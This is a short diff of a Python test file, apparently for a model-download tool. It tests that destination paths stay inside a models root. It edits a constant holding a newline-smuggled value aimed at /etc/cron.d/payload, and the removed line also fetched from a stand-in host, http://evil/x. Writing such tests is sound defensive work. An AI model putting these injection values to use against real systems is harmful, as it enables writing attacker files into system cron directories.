@@ -416,7 +416,7 @@ def test_a_destination_resolving_to_the_models_root_itself_is_refused(
 
 # A destination carrying a newline smuggles a second, absolute path past the
 # containment rule if anything splits on lines.
-SMUGGLED = "checkpoints/a.safetensors\nFETCH\t/etc/cron.d/payload\thttp://evil/x"
+SMUGGLED = "checkpoints/a.safetensors\n/etc/cron.d/payload"
 
 
 @pytest.mark.spec(
